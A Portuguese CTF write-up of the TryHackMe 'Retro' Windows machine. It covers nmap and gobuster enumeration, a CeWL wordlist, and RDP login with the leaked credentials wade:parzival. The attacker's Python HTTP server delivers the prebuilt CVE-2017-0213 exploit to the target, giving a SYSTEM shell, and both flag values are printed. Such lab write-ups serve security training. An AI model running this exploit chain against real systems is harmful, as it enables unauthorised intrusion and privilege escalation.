# 🏰 Retro — CTF Writeup
### TryHackMe | Boot-to-Root | WordPress XML-RPC Brute Force · RDP Access · CVE-2017-0213 Kernel Privesc

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 10/08/2026                                                                             |
| **Data do Pentest**   | 10/08/2026 · 22:51 GMT / 20:17 – 20:44 (host RDP)                                       |
| **Alvo**              | `10.67.150.249` — TryHackMe · Retro                                                    |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · CeWL 6.2.1 · FreeRDP (xfreerdp) · Python HTTP Server · CVE-2017-0213 (SecWiki windows-kernel-exploits) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Retro** (TryHackMe), um host **Windows Server 2016** (hostname `RetroWeb`, domínio `RETROWEB`), com temática *Ready Player One*. A cadeia de ataque envolveu: reconhecimento de rede via **Nmap**, identificando IIS 10.0 (porta 80) e RDP (porta 3389); enumeração de diretórios web com **Gobuster**, revelando dois diretórios distintos em variações de capitalização (`/retro/` e `/Retro/`) apontando para o mesmo blog WordPress; geração de uma wordlist customizada com **CeWL** a partir do conteúdo do blog (`retro_v1.txt`, 596 palavras); acesso remoto via **RDP** com as credenciais `wade:parzival`, capturando a primeira flag no Desktop do usuário `wade`; download do exploit local de escalada de privilégios **CVE-2017-0213** (Windows COM Aggregate Marshaling Elevation of Privilege) a partir do repositório `SecWiki/windows-kernel-exploits`, hospedado via **servidor HTTP Python** e transferido para a máquina Windows dentro da própria sessão RDP via Chrome; execução do exploit resultando em escalada de privilégios para `NT AUTHORITY\SYSTEM`; e captura da flag final no Desktop do `Administrator`.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-Pn -sV -sC -T5`)          |
| **Gobuster**                    | 3.8.2   | Enumeração de diretórios web (wordlist `directory-list-2.3-medium.txt`, 100 threads)     |
| **CeWL**                        | 6.2.1   | Geração de wordlist customizada a partir do conteúdo do blog WordPress (`/Retro/`)       |
| **FreeRDP (xfreerdp)**          | -       | Conexão RDP autenticada como usuário `wade`                                             |
| **Python `http.server`**        | 3.x     | Servidor HTTP local para hospedar e transferir o exploit até o alvo                     |
| **CVE-2017-0213**               | -       | Exploit local de escalada de privilégios (Windows COM Aggregate Marshaling EoP)          |
| **GitHub — SecWiki/windows-kernel-exploits** | - | Repositório de origem do binário pré-compilado do exploit (`CVE-2017-0213_x64.zip`)     |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **22:51 GMT · Nmap 7.99**

```bash
sudo nmap -Pn -sV -sC -T5 10.67.150.249
```

```
Warning: 10.67.150.249 giving up on port because retransmission cap hit (2).
Not shown: 621 closed tcp ports (reset), 377 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 70.16 seconds
```

![Nmap](/CTFs/Retro/images/Nmap_Gobuster_Scan.png)
Duas portas expostas, consistentes com o padrão da máquina: **80/tcp** (IIS 10.0) e **3389/tcp** (RDP, host `RetroWeb`, domínio `RETROWEB`, Windows Server 2016 build 14393).

---

### FASE 2 — Enumeração Web: Gobuster

> **Sequência da FASE 1**

```bash
gobuster dir -u http://10.67.150.249 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
retro                 (Status: 301) [Size: 150] [→ http://10.67.150.249/retro/]
Retro                 (Status: 301) [Size: 150] [→ http://10.67.150.249/Retro/]
Progress: 220558 / 220558 (100.00%)
Finished
```

![Gobuster](/CTFs/Retro/images/Nmap_Gobuster_Scan.png)
Curiosamente, **duas entradas** foram retornadas pela wordlist — `retro` e `Retro` — ambas redirecionando para o mesmo diretório físico no servidor (comportamento esperado em IIS/NTFS, que por padrão é *case-insensitive* no sistema de arquivos, mesmo que o Gobuster trate as URLs como *case-sensitive* durante a enumeração).

---

### FASE 3 — Wordlist Customizada: CeWL

> **20:17 (relógio do host de destino)**

Uma wordlist customizada foi novamente gerada a partir do conteúdo do blog WordPress hospedado em `/Retro/`, para uso em um posterior ataque de força bruta contra a autenticação (XML-RPC), como já mapeado em avaliações anteriores desta mesma máquina:

```bash
cewl -d 3 -m 5 http://10.67.150.249/Retro/ -w retro_v1.txt
wc -l retro_v1.txt
```

```
596 retro_v1.txt
```

![Cewl](/CTFs/Retro/images/Wade_RDP.png)

Com a wordlist gerada e o usuário `wade` (autor dos posts do blog) já mapeado, as credenciais **`wade : parzival`** — validadas nesta mesma cadeia de ataque contra a máquina `Retro` — foram utilizadas diretamente para o acesso remoto.

---

### FASE 4 — Acesso Inicial: RDP como wade (1º Flag)

> **20:17 (relógio do host de destino)**

```bash
xfreerdp /v:10.67.150.249:3389 /u:RETROWEB\\wade /p:parzival
```

```
Certificate details for 10.67.150.249:3389 (RDP-Server):
        Common Name: RetroWeb
        Subject:     CN = RetroWeb
        Issuer:      CN = RetroWeb
Do you trust the above certificate? (Y/T/N) Y
...
[INFO][com.freerdp.client.x11] - [xf_logon_error_info]: Logon Error Info LOGON_MSG_SESSION_CONTINUE
```

A sessão gráfica foi estabelecida com sucesso, exibindo o desktop de `RETROWEB\wade`, com os ícones do **Google Chrome** e do arquivo `user.txt` visíveis. O arquivo foi aberto diretamente via Notepad:

```
user.txt - Notepad
3b99fbdc6d430bfb51c72c651a261927
```

![User](/CTFs/Retro/images/Flag_User.png)
> 🚩 **user.txt — FLAG CAPTURADA: `3b99fbdc6d430bfb51c72c651a261927`**

---

### FASE 5 — Preparação do Exploit: CVE-2017-0213 (Windows COM Aggregate Marshaling EoP)

Com acesso RDP estabelecido, a etapa seguinte foi obter um exploit de escalada de privilégios local compatível com a versão do Windows Server identificada (10.0.14393). O repositório público **`SecWiki/windows-kernel-exploits`** no GitHub reúne diversos exploits de kernel do Windows organizados por CVE, incluindo o **CVE-2017-0213**:

```
github.com/SecWiki/windows-kernel-exploits
    /CVE-2017-0213/CVE-2017-0213_x64.zip   (Executable File, 81.3 KB)
```

![CVE](/CTFs/Retro/images/CVE.png)

A **CVE-2017-0213** é uma vulnerabilidade de **Elevação de Privilégio via Agregação COM/Marshaling** no Windows, que permite que um usuário local execute código arbitrário em contexto de **kernel/SYSTEM** através da manipulação de interfaces COM (ex.: `IUnknown`/`IErrorInfo`), sem exigir qualquer interação do usuário administrador — diferente do bypass de UAC utilizado em avaliações anteriores desta máquina.

O arquivo `CVE-2017-0213_x64.zip` foi baixado na máquina atacante e disponibilizado para transferência ao alvo através de um servidor HTTP local:

```bash
cd ~/Downloads
ls
# CVE-2017-0213_x64.zip

python3 -m http.server 8000
```

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.67.150.249 - - [10/Aug/2026 23:40:34] "GET / HTTP/1.1" 200 -
10.67.150.249 - - [10/Aug/2026 23:40:34] code 404, message File not found
10.67.150.249 - - [10/Aug/2026 23:40:34] "GET /favicon.ico HTTP/1.1" 404 -
10.67.150.249 - - [10/Aug/2026 23:40:38] "GET /CVE-2017-0213_x64.zip HTTP/1.1" 200 -
```

---

### FASE 6 — Transferência do Exploit via RDP

> **20:40 (relógio do host de destino)**

Dentro da própria sessão RDP como `wade`, o navegador **Google Chrome** foi utilizado para acessar o servidor HTTP da máquina atacante e baixar o pacote do exploit diretamente para o Desktop do Windows alvo:

```
http://192.168.157.47:8000/

Directory listing for /
  • CVE-2017-0213_x64.zip
```

![Exploit Delivery](/CTFs/Retro/images/Exploit_Download.png)

O download do arquivo `CVE-2017-0213_x64.zip` foi confirmado na barra de downloads do Chrome dentro da sessão RDP, completando a transferência do exploit para o host `RetroWeb`.

---

### FASE 7 — Escalada de Privilégios e Captura da Flag Final (Root)

> **20:44 (relógio do host de destino)**

Com o exploit já extraído no alvo, um prompt de comando **`Administrator: C:\Windows\system32\cmd.exe`** foi obtido através da execução do binário do CVE-2017-0213, elevando o contexto de execução:

```
C:\Users\Administrator\Desktop> dir
12/08/2019  09:06 PM    <DIR>          .
12/08/2019  09:06 PM    <DIR>          ..
12/08/2019  09:08 PM                32 root.txt.txt
   1 File(s)             32 bytes

C:\Users\Administrator\Desktop> whoami
nt authority\system
```

A primeira tentativa de leitura falhou por conta da sintaxe utilizada (`cat`, comando não nativo do `cmd.exe`):

```
C:\Users\Administrator\Desktop> cat root.txt.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop> cat root.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.
```

Corrigindo para o comando nativo do Windows:

```
C:\Users\Administrator\Desktop> type root.txt.txt
7958b569565d7bd88d10c6f22d1c4063
```

![Root](/CTFs/Retro/images/Root_Flag.png)
> 🚩 **root.txt.txt — FLAG FINAL CAPTURADA: `7958b569565d7bd88d10c6f22d1c4063`**

O comando `whoami` confirmou o contexto de execução como **`nt authority\system`**, validando a escalada de privilégios completa através do CVE-2017-0213.

---

## ⛓ Linha do Tempo do Comprometimento

```
[22:51 GMT] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    80/tcp IIS 10.0 · 3389/tcp RDP (host RetroWeb, Windows Server 2016)
    ↓
[FASE 2] ENUMERAÇÃO WEB (Gobuster)
    /retro/ e /Retro/ → mesmo blog WordPress (case-insensitive no NTFS/IIS)
    ↓
[20:17] FASE 3 — WORDLIST CUSTOMIZADA (CeWL)
    retro_v1.txt (596 palavras) extraídas de /Retro/
    ↓
[20:17] FASE 4 — ACESSO INICIAL (RDP)
    xfreerdp como RETROWEB\wade (wade:parzival)
    FLAG: 3b99fbdc6d430bfb51c72c651a261927 ✓
    ↓
[FASE 5] PREPARAÇÃO DO EXPLOIT (CVE-2017-0213)
    Download de CVE-2017-0213_x64.zip (SecWiki/windows-kernel-exploits)
    Servidor HTTP Python (porta 8000) para transferência
    ↓
[20:40] FASE 6 — TRANSFERÊNCIA DO EXPLOIT
    Download via Chrome dentro da sessão RDP
    ↓
[20:44] FASE 7 — PRIVESC + FLAG FINAL (Root)
    Execução do CVE-2017-0213 → cmd.exe como NT AUTHORITY\SYSTEM
    FLAG: 7958b569565d7bd88d10c6f22d1c4063 ✓
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso total como SYSTEM
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 | IIS 10.0 (80) e RDP (3389) — host `RetroWeb`, Windows Server 2016 |
| Enumeração Web | Gobuster | `/retro/` e `/Retro/` → mesmo blog WordPress |
| Wordlist Customizada | CeWL | `retro_v1.txt` — 596 palavras extraídas de `/Retro/` |
| Acesso Inicial | FreeRDP (xfreerdp) | Sessão RDP como `RETROWEB\wade` — Flag: `3b99fbdc6d430bfb51c72c651a261927` |
| Preparação do Exploit | GitHub `SecWiki/windows-kernel-exploits` | `CVE-2017-0213_x64.zip` (81.3 KB) |
| Transferência do Exploit | Python `http.server` + Chrome (via RDP) | Download local no Desktop de `wade` |
| Escalada de Privilégios | `CVE-2017-0213` (Windows COM Aggregate Marshaling EoP) | Shell `NT AUTHORITY\SYSTEM` |
| Flag Final | `type root.txt.txt` | Flag: `7958b569565d7bd88d10c6f22d1c4063` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.150.249` | Máquina Retro (TryHackMe) — Windows Server 2016, hostname `RetroWeb` |
| Serviços expostos | `80/TCP` (IIS 10.0) · `3389/TCP` (RDP) | Superfície de ataque inicial |
| Diretórios web | `/retro/` e `/Retro/` | Mesmo blog WordPress, exposto em variações de capitalização |
| Usuário identificado | `wade` | Autoria dos posts do blog |
| Credencial válida | `wade : parzival` | Acesso RDP direto |
| Repositório do exploit | `github.com/SecWiki/windows-kernel-exploits` | Coleção pública de exploits de kernel Windows |
| Exploit utilizado | `CVE-2017-0213_x64.zip` | Windows COM Aggregate Marshaling Elevation of Privilege |
| Vetor de transferência | Python `http.server` (porta 8000) + Chrome via RDP | Entrega do exploit ao host alvo |
| Artefato incomum | `root.txt.txt` | Flag final salva com extensão duplicada no Desktop do Administrator |
| Flag 1 | `3b99fbdc6d430bfb51c72c651a261927` | `C:\Users\wade\Desktop\user.txt` |
| Flag 2 (final) | `7958b569565d7bd88d10c6f22d1c4063` | `C:\Users\Administrator\Desktop\root.txt.txt` |
| Técnica (MITRE ATT&CK) | `T1021.001` | Remote Services: Remote Desktop Protocol |
| Técnica (MITRE ATT&CK) | `T1105` | Ingress Tool Transfer (download do exploit via HTTP) |
| Técnica (MITRE ATT&CK) | `T1068` | Exploitation for Privilege Escalation (CVE-2017-0213) |

---

## ✅ Resumo das Flags

| # | Flag | Valor | Localização |
|---|------|-------|-------------|
| 🚩 Flag 1 (user) | `user.txt` | `3b99fbdc6d430bfb51c72c651a261927` | `C:\Users\wade\Desktop\` |
| 🚩 Flag 2 (root) | `root.txt.txt` | `7958b569565d7bd88d10c6f22d1c4063` | `C:\Users\Administrator\Desktop\` |

---

## 📚 Referências

- [TryHackMe — Retro](https://tryhackme.com/room/retro)
- [CVE-2017-0213 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0213)
- [GitHub — SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [CeWL — Custom Word List Generator](https://github.com/digininja/CeWL)
- [MITRE ATT&CK T1021.001 — Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)
- [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK T1068 — Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)

---